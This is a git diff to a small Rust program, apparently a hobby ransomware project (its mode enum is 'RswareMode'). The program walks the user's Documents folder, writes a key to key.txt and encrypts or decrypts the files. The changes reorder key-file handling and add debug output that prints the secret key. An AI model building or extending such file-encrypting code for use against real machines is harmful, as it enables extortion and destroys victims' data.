@@ -11,15 +11,7 @@ const KEY_FILE_NAME:		&str	= "key.txt";
 type IDFC<T>		= Result<T, Box<dyn std::error::Error>>;
 
 fn main() -> IDFC<()> {
-	let target_dir = document_dir().unwrap();
-	let mut keyfile_loc = target_dir.clone();
-
-	keyfile_loc.push(KEY_FILE_NAME);
-	let keyfile_loc = keyfile_loc; // make immutable
-
-	fs::File::create(&keyfile_loc)?;
-	let canonical_keyfile_path = keyfile_loc.canonicalize()?;
-
+	// Ask which mode to run in
 	println!("E___ = encrypt, D___ = decrypt, any else = quit");
 	let mode_choice: String = read!();
 	let mode_choice_firstchar = mode_choice.chars().nth(0).unwrap().to_lowercase().to_string();
@@ -34,11 +26,32 @@ fn main() -> IDFC<()> {
 		return Ok(())
 	};
 
+	// Target the Documents folder
+	let target_dir = document_dir().unwrap();
+	let mut keyfile_loc = target_dir.clone();
+
+	keyfile_loc.push(KEY_FILE_NAME);
+	let keyfile_loc = keyfile_loc; // make immutable
+
+	if matches!(mode, RswareMode::Encrypt) {
+		// canonicalize throws errors if the file doesn't exist.
+		// We still want errors if the user tries decrypting without a key.
+		// plus, create() clears contents, and that would suck if you had a key
+		fs::File::create(&keyfile_loc)?;
+	}
+	let canonical_keyfile_path =
+		keyfile_loc.canonicalize().expect(
+			&format!("There was an error searching for your {}", KEY_FILE_NAME)
+		);
+
 	let entries = WalkDir::new(target_dir);
+
+	dbg!(&mode);
 
 	match mode {
 		RswareMode::Encrypt	=> {
 			let key = SecretKey::default();
+			dbg!(&key.unprotected_as_bytes());
 			fs::write(keyfile_loc, key.unprotected_as_bytes())?;
 
 			// encrypt shit :P
@@ -153,6 +166,7 @@ fn read_keyfile(keyfile: &Path) -> IDFC<SecretKey> {
 	Ok(SecretKey::from_slice(&keyfile_data[..])?)
 }
 
+#[derive(Debug)]
 enum RswareMode {
 	Encrypt,
 	Decrypt,
